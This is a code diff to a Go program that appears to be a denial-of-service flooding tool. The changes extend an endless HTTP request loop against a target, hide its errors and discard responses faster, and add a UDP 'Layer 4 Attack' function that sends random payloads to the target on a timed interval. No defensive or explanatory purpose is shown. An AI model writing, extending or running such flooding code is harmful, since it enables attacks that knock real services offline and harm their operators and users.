@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
+	"net"
 	"net/http"
 	"runtime"
 	"strings"
@@ -12,10 +14,11 @@ import (
 )
 
 func DoAttacking(grindex int) {
+
 	for i := 0; ; i++ {
 		if result, err := DoHttpRequest(); err != nil {
-			PrintError(grindex, i, err.Error()) // Red. Client ERROR
-			runtime.GC()                        // Clean up memory to prevent memory overflow
+			//PrintError(grindex, i, err.Error()) // Red. Client ERROR
+			runtime.GC() // Clean up memory to prevent memory overflow
 		} else {
 			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                                                     // Green. Status code is 200
 			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") && !strings.Contains(*result, "302") { // Status code is not 200/301
@@ -30,7 +33,7 @@ func DoAttacking(grindex int) {
 }
 
 func DoHttpRequest() (*string, error) {
-	request, err := http.NewRequest(Method, TargetUrl, nil)
+	request, err := http.NewRequest(tmpMethod, Target, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -47,11 +50,18 @@ func DoHttpRequest() (*string, error) {
 	if err != nil {
 		return nil, err
 	}
+	io.Copy(ioutil.Discard, response.Body)
 	defer response.Body.Close()
-	// Ignore and read the responseBody
-	_, _ = ioutil.ReadAll(response.Body)
 	runtime.GC() // Clean up memory to prevent memory overflow
 	return &response.Status, err
+}
+
+// Layer 4 Attack
+func DoUDPAttacking(grindex int) {
+	conn, _ := net.Dial("udp", Target)
+	fmt.Fprint(conn, genRandstr(16))
+	conn.Close()
+	time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
 }
 
 func printWelcome() {
